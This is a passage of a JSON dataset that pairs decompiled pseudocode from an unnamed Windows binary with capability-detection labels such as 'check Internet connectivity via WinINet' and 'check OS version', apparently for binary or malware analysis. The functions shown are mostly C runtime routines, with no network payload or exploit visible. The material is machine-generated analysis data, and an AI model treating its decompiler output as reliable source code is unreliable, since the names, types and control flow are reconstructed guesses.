        "decompiled_code": "\nvoid __cdecl fcn.004060fa(uint noname_0, int32_t arg_ch)\n\n{\n    int32_t arg_10h;\n    ushort uVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    \n    arg_10h = in_ECX + 0x2c;\n    if (*(in_ECX + 0x28) == '\\0') {\n        uVar2 = *(arg_ch + 0x10);\n    }\n    else {\n        uVar2 = *(arg_ch + 0xc);\n    }\n    uVar2 = fcn.0040306c(uVar2, 0, arg_10h);\n    *(in_ECX + 0x10) = uVar2;\n    uVar2 = 0x54c277;\n    if (*(arg_ch + 0x2e) < 5) {\n        uVar2 = *(arg_ch + 0x20);\n    }\n    uVar2 = fcn.0040306c(uVar2, 0, arg_10h);\n    *(in_ECX + 0x14) = uVar2;\n    uVar2 = 0x54e5a4;\n    if (*(arg_ch + 0x2f) < 5) {\n        uVar2 = *(arg_ch + 0x24);\n    }\n    uVar2 = fcn.0040306c(uVar2, 0, arg_10h);\n    *(in_ECX + 0x18) = uVar2;\n    uVar1 = fcn.00404f70(**(arg_ch + 0x14), 0, arg_10h);\n    *(in_ECX + 0xc) = uVar1;\n    uVar1 = fcn.00404f70(**(arg_ch + 0x18), 0, arg_10h);\n    *(in_ECX + 0xe) = uVar1;\n    return;\n}\n",
        "token_count": 426
    },
    "004060ff": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004060ff(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00405e25(0, 0);\n    if (iVar1 == 0) {\n        iVar1 = 0x54c277;\n    }\n    fcn.00404b6a(iVar1);\n    if (arg_ch != 0) {\n        iVar1 = fcn.00405e25(0, arg_ch);\n        if (iVar1 != 0) goto code_r0x00462c92;\n    }\n    iVar1 = 0x54d840;\ncode_r0x00462c92:\n    fcn.00404b6a(iVar1);\n    return;\n}\n",
        "token_count": 169
    },
    "00406186": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406186(uint *arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    int32_t in_ECX;\n    char *pcVar1;\n    \n    if ((((*(in_ECX + 0x28) == '\\0') && (arg_ch < 3)) && (arg_10h < 2)) && (arg_14h < 5)) {\n        pcVar1 = \"+v$x+v$xv$+xv+$xv$+x+$vx+$vx$v+x+$vx$+vx+v $+v $v $+v +$v $++$ v+$ v$ v++$ v$+ v+xv$+ v$v$ +v+ $v$ ++x$v+ $v$v ++ $v$ +v\"\n                 + ((arg_10h + arg_ch * 2) * 5 + arg_14h) * 4;\n    }\n    else {\n        pcVar1 = \"$+xv\";\n    }\n    *arg_8h = *pcVar1;\n    return;\n}\n",
        "token_count": 247
    },
    "004061e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004061e0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    int32_t *piVar2;\n    \n    if (*(arg_ch + 4) != '\\0') {\n        puVar1 = fcn.004047eb();\n        *puVar1 = 0;\n        puVar1[1] = arg_8h << 0x1f;\n        return;\n    }\n    piVar2 = fcn.00401852();\n    *piVar2 = arg_8h << 0x1f;\n    return;\n}\n",
        "token_count": 135
    },
    "00406208": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004df219)\n\nfloat10 fcn.00406208(double param_1)\n\n{\n    uint32_t arg_ch;\n    uint32_t uVar1;\n    int32_t iVar2;\n    bool bVar3;\n    uint32_t in_MXCSR;\n    uint16_t in_FPUControlWord;\n    float10 fVar4;\n    double dVar5;\n    int64_t iVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    \n    arg_ch = param_1 >> 0x20;\n    if (*0x570754 != 0) {\n        bVar3 = (in_MXCSR & 0x7f80) == 0x1f80;\n        if (bVar3) {\n            bVar3 = (in_FPUControlWord & 0x7f) == 0x7f;\n        }\n        if (bVar3) {\n            uVar1 = arg_ch >> 0x14;\n            iVar6 = CONCAT44(*0x55b814, *0x55b810 - (arg_ch >> 0x14 & *0x55b830));\n            if ((uVar1 & 0x800) == 0) {\n                dVar5 = (param_1 >> iVar6) << iVar6;\n                if (uVar1 < 0x3ff) {\n                    return -(*0x55b820 < param_1) & *0x55b800;\n                }\n                if (uVar1 < 0x433) {\n                    return dVar5 + (-(dVar5 < param_1) & *0x55b800);\n                }\n            }\n            else {\n                if (uVar1 < 0xbff) {\n                    return *0x55b840;\n                }\n                if (uVar1 < 0xc33) {\n                    return (param_1 >> iVar6) << iVar6;\n                }\n            }\n            return param_1;\n        }\n    }\n    uVar1 = fcn.004051a0(0x1b3f, 0xffff);\n    if ((param_1._6_2_ & 0x7ff0) == 0x7ff0) {\n        iVar2 = fcn.004051b9(SUB84(param_1, 0), arg_ch);\n        if (2 < iVar2 - 1U) {\n            uVar8 = SUB84(*0x54fba0 + param_1, 0);\n            uVar9 = *0x54fba0 + param_1 >> 0x20;\n            uVar7 = 8;\ncode_r0x004e011c:\n            fVar4 = fcn.004055ce(uVar7, 0xc, param_1, uVar8, uVar9, uVar1);\n            return fVar4;\n        }\n        fcn.004051a0(uVar1, 0xffff);\n        dVar5 = param_1;\n    }\n    else {\n        fVar4 = fcn.004015d7();\n        dVar5 = fVar4;\n        if ((param_1 != fVar4) && ((uVar1 & 0x20) == 0)) {\n            uVar8 = SUB84(fVar4, 0);\n            uVar9 = fVar4 >> 0x20;\n            uVar7 = 0x10;\n            goto code_r0x004e011c;\n        }\n        fcn.004051a0(uVar1, 0xffff);\n    }\n    return dVar5;\n}\n",
        "token_count": 788
    },
    "00406249": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00406249(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    code *pcVar3;\n    char cVar4;\n    int16_t iVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    int32_t unaff_EBP;\n    int32_t iVar10;\n    uint32_t uVar11;\n    bool bVar12;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_28h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0040536c(0x44);\n    piVar2 = *(unaff_EBP + 0x14);\n    iVar7 = 0;\n    iVar10 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x34) = *(unaff_EBP + 8);\n    iVar5 = *piVar2;\n    *(unaff_EBP + -0x48) = *(unaff_EBP + 0xc);\n    iVar1 = iVar5;\n    while (iVar1 != 0) {\n        if (iVar1 == iVar5) {\n            iVar10 = iVar10 + 1;\n        }\n        iVar7 = iVar7 + 1;\n        iVar1 = piVar2[iVar7];\n    }\n    *(unaff_EBP + -0x3c) = iVar10;\n    fcn.004036e8(iVar10, 0);\n    *(unaff_EBP + -4) = 1;\n    uVar6 = fcn.00404ed5(1);\n    *(unaff_EBP + -0x4c) = uVar6;\n    *(unaff_EBP + -4) = 2;\n    uVar6 = fcn.00403d87(unaff_EBP + -0x50);\n    *(unaff_EBP + -0x38) = uVar6;\n    *(unaff_EBP + -4) = 0;\n    fcn.004050a6();\n    *(unaff_EBP + -0x40) = 0xfffffffe;\n    uVar9 = 1;\n    *(unaff_EBP + -0x30) = 1;\n    while( true ) {\n        uVar11 = 0;\n        iVar10 = 0;\n        *(unaff_EBP + -0x29) = 0;\n        *(unaff_EBP + -0x44) = 0;\n        if (*(unaff_EBP + -0x3c) == 0) break;\n        do {\n            iVar5 = piVar2[iVar10];\n            if (iVar5 != 0) {\n                do {\n                    if (iVar5 == *piVar2) break;\n                    iVar10 = iVar10 + 1;\n                    iVar5 = piVar2[iVar10];\n                } while (iVar5 != 0);\n            }\n            bVar12 = 0xf < *(unaff_EBP + -0x14);\n            iVar7 = unaff_EBP + -0x28;\n            if (0xf < *(unaff_EBP + -0x14)) {\n                iVar7 = *(unaff_EBP + -0x28);\n            }\n            if (*(iVar7 + uVar11) == '\\0') {\n                iVar10 = iVar10 + uVar9;\n                if ((piVar2[iVar10] == *piVar2) || (piVar2[iVar10] == 0)) {\n                    if (0x7e < uVar9) {\n                        uVar9 = 0x7f;\n                    }\n                    iVar7 = unaff_EBP + -0x28;\n                    if (bVar12) {\n                        iVar7 = *(unaff_EBP + -0x28);\n                    }\n                    *(iVar7 + uVar11) = uVar9;\n                    uVar9 = *(unaff_EBP + -0x30);\n                    *(unaff_EBP + -0x40) = uVar11;\n                    goto code_r0x00467c31;\n                }\n                cVar4 = fcn.0040640b(*(unaff_EBP + -0x48));\n                if (cVar4 != '\\0') {\ncode_r0x00467bf6:\n                    uVar9 = *(unaff_EBP + -0x30);\n                    uVar8 = uVar9;\n                    if (0x7e < uVar9) {\n                        uVar8 = 0x7f;\n                    }\n                    iVar7 = unaff_EBP + -0x28;\n                    if (0xf < *(unaff_EBP + -0x14)) {\n                        iVar7 = *(unaff_EBP + -0x28);\n                    }\n                    *(iVar7 + uVar11) = uVar8;\n                    goto code_r0x00467c31;\n                }\n                if (*(unaff_EBP + 0x18) == '\\x01') {\n                    if (*(*(unaff_EBP + -0x34) + 4) == '\\0') {\n                        fcn.004050a1();\n                    }\n                    bVar12 = piVar2[iVar10] == *(*(unaff_EBP + -0x34) + 6);\n                }\n                else {\n                    pcVar3 = *(**(unaff_EBP + -0x38) + 0x20);\n                    (**0x573000)(piVar2[iVar10]);\n                    uVar9 = (*pcVar3)();\n                    iVar7 = *(unaff_EBP + -0x34);\n                    *(unaff_EBP + -0x4c) = uVar9 & 0xffff;\n                    if (*(iVar7 + 4) == '\\0') {\n                        fcn.004050a1();\n                    }\n                    pcVar3 = *(**(unaff_EBP + -0x38) + 0x20);\n                    (**0x573000)(*(iVar7 + 6));\n                    iVar5 = (*pcVar3)();\n                    uVar11 = *(unaff_EBP + -0x44);\n                    bVar12 = *(unaff_EBP + -0x4c) == iVar5;\n                }\n                if (!bVar12) goto code_r0x00467bf6;\n                uVar9 = *(unaff_EBP + -0x30);\n                cVar4 = '\\x01';\n                *(unaff_EBP + -0x29) = 1;\n            }\n            else {\n                iVar7 = unaff_EBP + -0x28;\n                if (bVar12) {\n                    iVar7 = *(unaff_EBP + -0x28);\n                }\n                iVar10 = iVar10 + *(iVar7 + uVar11);\ncode_r0x00467c31:\n                cVar4 = *(unaff_EBP + -0x29);\n            }\n            uVar11 = uVar11 + 1;\n            *(unaff_EBP + -0x44) = uVar11;\n        } while (uVar11 < *(unaff_EBP + -0x3c));\n        if ((cVar4 == '\\0') || (cVar4 = fcn.0040640b(*(unaff_EBP + -0x48)),  cVar4 != '\\0')) break;\n        *(unaff_EBP + -0x30) = *(unaff_EBP + -0x30) + 1;\n        fcn.004027a2();\n        *(unaff_EBP + -0x40) = 0xffffffff;\n        uVar9 = *(unaff_EBP + -0x30);\n    }\n    fcn.004029b9();\n    fcn.004067d0();\n    return;\n}\n",
        "token_count": 1786
    },
    "00406267": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406267(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, double *arg_18h)\n\n{\n    double dVar1;\n    double dVar2;\n    int32_t iVar3;\n    \n    dVar1 = ABS(CONCAT44(arg_ch, arg_8h));\n    dVar2 = *0x552560;\n    if (arg_14h == 0x7ff00000) {\n        if (arg_10h == 0) {\n            if ((dVar1 <= 1.0) && (dVar2 = 1.0,  ((1.0 < dVar1) << 8 | (dVar1 == 1.0) << 0xe) == 0)) {\n                dVar2 = 0.0;\n            }\n            goto code_r0x004d4c76;\n        }\n    }\n    else if ((arg_14h == -0x100000) && (arg_10h == 0)) {\n        if (dVar1 <= 1.0) {\n            dVar2 = 1.0;\n            if (((1.0 < dVar1) << 8 | (dVar1 == 1.0) << 0xe) == 0) {\n                dVar2 = *0x552560;\n            }\n        }\n        else {\n            dVar2 = 0.0;\n        }\n        goto code_r0x004d4c76;\n    }\n    if (arg_ch == 0x7ff00000) {\n        if (arg_8h != 0) {\n            return 0;\n        }\n        dVar1 = CONCAT44(arg_14h, arg_10h);\n        if ((((dVar1 < 0.0) << 8 | (dVar1 == 0.0) << 0xe) != 0) && (dVar2 = 0.0,  0.0 <= dVar1)) {\n            dVar2 = 1.0;\n        }\n    }\n    else {\n        if (arg_ch != -0x100000) {\n            return 0;\n        }\n        if (arg_8h != 0) {\n            return 0;\n        }\n        iVar3 = fcn.00404336(CONCAT44(arg_14h, arg_10h));\n        dVar1 = CONCAT44(arg_14h, arg_10h);\n        if (((dVar1 < 0.0) << 8 | (dVar1 == 0.0) << 0xe) == 0) {\n            dVar2 = *0x552560;\n            if (iVar3 == 1) {\n                dVar2 = -*0x552560;\n            }\n        }\n        else if (0.0 <= dVar1) {\n            dVar2 = 1.0;\n        }\n        else {\n            dVar2 = 0.0;\n            if (iVar3 == 1) {\n                dVar2 = *0x5525a0;\n            }\n        }\n    }\ncode_r0x004d4c76:\n    *arg_18h = dVar2;\n    return 0;\n}\n",
        "token_count": 708
    },
    "004062c6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004062c6(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    int32_t in_ECX;\n    uint32_t var_4h;\n    \n    piVar2 = *(in_ECX + 0xc);\n    if (piVar2 == NULL) {\n        piVar2 = fcn.004039a4();\n        *(in_ECX + 0xc) = piVar2;\n    }\n    iVar1 = *piVar2;\n    *piVar2 = 0;\n    var_4h = 0;\n    uVar3 = fcn.00403607(*(in_ECX + 0x10) + -2, &var_4h, 10);\n    *arg_8h = uVar3;\n    piVar4 = *(in_ECX + 0xc);\n    if (piVar4 == NULL) {\n        piVar4 = fcn.004039a4();\n        *(in_ECX + 0xc) = piVar4;\n    }\n    if ((*piVar4 == 0x22) || (var_4h < *(in_ECX + 0x10))) {\n        uVar3 = 0;\n    }\n    else {\n        *(in_ECX + 0x10) = var_4h;\n        uVar3 = 1;\n    }\n    if ((*piVar2 == 0) && (iVar1 != 0)) {\n        *piVar2 = iVar1;\n    }\n    return uVar3;\n}\n",
        "token_count": 355
    },
    "004062f3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004062f3(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    int32_t in_ECX;\n    uint32_t var_4h;\n    \n    piVar2 = *(in_ECX + 0xc);\n    if (piVar2 == NULL) {\n        piVar2 = fcn.004039a4();\n        *(in_ECX + 0xc) = piVar2;\n    }\n    iVar1 = *piVar2;\n    *piVar2 = 0;\n    var_4h = 0;\n    uVar3 = fcn.00403607(*(in_ECX + 0x10) + -2, &var_4h, 10);\n    *arg_8h = uVar3;\n    piVar4 = *(in_ECX + 0xc);\n    if (piVar4 == NULL) {\n        piVar4 = fcn.004039a4();\n        *(in_ECX + 0xc) = piVar4;\n    }\n    if ((*piVar4 == 0x22) || (var_4h < *(in_ECX + 0x10))) {\n        uVar3 = 0;\n    }\n    else {\n        *(in_ECX + 0x10) = var_4h;\n        uVar3 = 1;\n    }\n    if ((*piVar2 == 0) && (iVar1 != 0)) {\n        *piVar2 = iVar1;\n    }\n    return uVar3;\n}\n",
        "token_count": 355
    },
    "00406302": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406302(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    \n    if (arg_8h != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x5705b8, 0, arg_8h);\n        if (iVar1 == 0) {\n            puVar2 = fcn.004039a4();\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar3 = fcn.00404895(uVar3);\n            *puVar2 = uVar3;\n        }\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "0040632a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * fcn.0040632a(int32_t param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    int32_t *piVar3;\n    uint unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uint unaff_retaddr;\n    uint noname_2;\n    uint noname_3;\n    uint in_stack_ffffffcc;\n    uint32_t in_stack_ffffffd0;\n    uint in_stack_ffffffd4;\n    int32_t *noname_7;\n    int32_t *in_stack_ffffffdc;\n    uchar *noname_9;\n    int32_t noname_10;\n    uint *noname_11;\n    \n    noname_9 = &stack0xffffffcc;\n    noname_11 = 0x41e470;\n    noname_10 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    noname_3 = 0;\n    noname_2 = 0x41bf4a;\n    fcn.004060f5(0);\n    piVar2 = *0x56ebd4;\n    noname_7 = *0x56ebd4;\n    if (*0x56ebc4 == 0) {\n        noname_2 = 0;\n        fcn.004060f5(0);\n        if (*0x56ebc4 == 0) {\n            *0x56ebc4 = *0x56f210 + 1;\n            *0x56f210 = *0x56ebc4;\n        }\n        fcn.00403684();\n    }\n    iVar1 = *(param_1 + 4);\n    if ((*(iVar1 + 0xc) < *0x56ebc4 || *(iVar1 + 0xc) == *0x56ebc4) ||\n       (piVar3 = *(*(iVar1 + 8) + *0x56ebc4 * 4),  piVar3 == NULL)) {\n        if (*(iVar1 + 0x14) != '\\0') {\n            in_stack_ffffffd0 = *0x56ebc4;\n            iVar1 = fcn.00404ee4();\n            in_stack_ffffffdc = piVar2;\n            if ((in_stack_ffffffd0 <= *(iVar1 + 0xc) && *(iVar1 + 0xc) != in_stack_ffffffd0) &&\n               (piVar3 = *(*(iVar1 + 8) + in_stack_ffffffd0 * 4),  piVar3 != NULL)) goto code_r0x0041c018;\n        }\n        piVar3 = piVar2;\n        if (piVar2 == NULL) {\n            iVar1 = fcn.00403a9e(&stack0xffffffd8, param_1, noname_2, noname_3, in_stack_ffffffcc, in_stack_ffffffd0, \n                                 in_stack_ffffffd4, noname_7, in_stack_ffffffdc, noname_9, noname_10, noname_11, 0, \n                                 unaff_ESI, unaff_EDI, unaff_EBX, unaff_EBP, unaff_retaddr, param_1, param_2, param_3, \n                                 param_4);\n            if (iVar1 == -1) {\n                piVar2 = fcn.004057f9();\n                if (noname_11 != NULL) {\n                    piVar2 = (***noname_11)(1);\n                }\n                return piVar2;\n            }\n            piVar2 = noname_7;\n            fcn.0040238d(noname_7);\n            piVar3 = noname_7;\n            (**(*piVar2 + 4))();\n            *0x56ebd4 = piVar3;\n        }\n    }\ncode_r0x0041c018:\n    fcn.00403684();\n    *in_FS_OFFSET = noname_10;\n    return piVar3;\n}\n",
        "token_count": 919
    },
    "00406339": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00406339(int32_t param_1)\n\n{\n    int32_t iVar1;\n    unkuint3 Var2;\n    \n    *(param_1 + 0x458) = *(param_1 + 0x458) + 1;\n    iVar1 = *(param_1 + 0x458);\n    Var2 = iVar1 >> 8;\n    if ((iVar1 != 3) && ((iVar1 != 2 || (*(param_1 + 0x45c) != 1)))) {\n        *(param_1 + 0xaa4) = 0xffffffff;\n        *(param_1 + 0xaa8) = 0xffffffff;\n        *(param_1 + 0x45c) = 0;\n        *(param_1 + 0x24) = 0;\n        *(param_1 + 0x28) = 0;\n        *(param_1 + 0x10) = *(param_1 + 0x460);\n        return CONCAT31(Var2, 1);\n    }\n    return Var2 << 8;\n}\n",
        "token_count": 240
    },
    "00461d02": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00461d02(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint32_t arg_10h_00;\n    bool bVar2;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    if (*(in_ECX + 0x38) != 0) {\n        iVar1 = fcn.00403b3e(arg_8h, arg_ch, arg_10h);\n        return iVar1;\n    }\n    if (**(in_ECX + 0x20) == 0) {\n        var_4h = 0;\n    }\n    else {\n        var_4h = **(in_ECX + 0x30);\n    }\n    var_8h = var_4h >> 0x1f;\n    arg_10h_00 = arg_ch;\n    if ((-1 < arg_10h) && ((0 < arg_10h || (arg_ch != 0)))) {\n        if ((-1 < var_8h) && ((var_4h < 0 && -1 < var_8h || (var_4h != 0)))) {\n            if ((arg_10h <= var_8h) && ((arg_10h < var_8h || (arg_ch < var_4h)))) {\n                var_4h = arg_ch;\n                var_8h = arg_10h;\n            }\n            fcn.0040576d(**(in_ECX + 0x20), arg_8h, var_4h);\n            arg_10h_00 = arg_ch - var_4h;\n            **(in_ECX + 0x30) = **(in_ECX + 0x30) - var_4h;\n            **(in_ECX + 0x20) = **(in_ECX + 0x20) + var_4h;\n            arg_8h = arg_8h + var_4h;\n            bVar2 = (arg_10h - var_8h) - (arg_ch < var_4h) < 0;\n            if ((bVar2) || ((arg_10h - var_8h == arg_ch < var_4h || bVar2 && (arg_10h_00 == 0)))) goto code_r0x00461dc5;\n        }\n        if (*(in_ECX + 0x4c) != 0) {\n            iVar1 = fcn.00401fc3(arg_8h, 1, arg_10h_00, *(in_ECX + 0x4c));\n            arg_10h_00 = arg_10h_00 - iVar1;\n        }\n    }\ncode_r0x00461dc5:\n    return arg_ch - arg_10h_00;\n}\n",
        "token_count": 662
    },
    "004063f2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004063f2(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    int32_t in_ECX;\n    uint32_t var_4h;\n    \n    piVar2 = *(in_ECX + 0xc);\n    if (piVar2 == NULL) {\n        piVar2 = fcn.004039a4();\n        *(in_ECX + 0xc) = piVar2;\n    }\n    iVar1 = *piVar2;\n    *piVar2 = 0;\n    var_4h = 0;\n    uVar3 = fcn.004048e5(*(in_ECX + 0x10) + -1, &var_4h, 10);\n    *arg_8h = uVar3;\n    piVar4 = *(in_ECX + 0xc);\n    if (piVar4 == NULL) {\n        piVar4 = fcn.004039a4();\n        *(in_ECX + 0xc) = piVar4;\n    }\n    if ((*piVar4 == 0x22) || (var_4h < *(in_ECX + 0x10))) {\n        uVar3 = 0;\n    }\n    else {\n        *(in_ECX + 0x10) = var_4h;\n        uVar3 = 1;\n    }\n    if ((*piVar2 == 0) && (iVar1 != 0)) {\n        *piVar2 = iVar1;\n    }\n    return uVar3;\n}\n",
        "token_count": 356
    },
    "004063f7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004063f7(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t in_MXCSR;\n    uint var_4h;\n    \n    if ((*0x56ec4c < 1) || ((arg_8h != -0x3ffffd4c && (arg_8h != -0x3ffffd4b)))) {\n        return arg_8h;\n    }\n    uVar1 = in_MXCSR ^ 0x3f;\n    if ((uVar1 & 0x81) != 0) {\n        if ((uVar1 & 0x204) == 0) {\n            return -0x3fffff72;\n        }\n        if ((uVar1 & 0x102) != 0) {\n            if ((uVar1 & 0x408) == 0) {\n                return -0x3fffff6f;\n            }\n            if ((uVar1 & 0x810) != 0) {\n                if ((uVar1 & 0x1020) != 0) {\n                    return arg_8h;\n                }\n                return -0x3fffff71;\n            }\n            return -0x3fffff6d;\n        }\n    }\n    return -0x3fffff70;\n}\n",
        "token_count": 292
    },
    "0040640b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040640b(int32_t *arg_8h)\n\n{\n    int32_t *in_ECX;\n    \n    if (*(in_ECX + 1) == '\\0') {\n        fcn.004050a1();\n    }\n    if (*(arg_8h + 1) == '\\0') {\n        fcn.004050a1();\n    }\n    if (*in_ECX == 0) {\n        if (*arg_8h != 0) {\n            return 0;\n        }\n    }\n    else if (*arg_8h == 0) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 142
    },
    "0040648d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040648d(int32_t arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t *in_ECX;\n    \n    if (*(in_ECX + 1) < '\\x02') {\n        if (((*in_ECX == 0) || (arg_8h == 2)) || (arg_8h == 3)) {\n            fcn.00402e8c(arg_8h);\n        }\n        else if (arg_8h != 0) {\n            arg_8h_00 = fcn.0040487c(arg_8h);\n            fcn.0040564b(arg_8h_00);\n        }\n    }\n    return;\n}\n",
        "token_count": 159
    },
    "004064ce": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
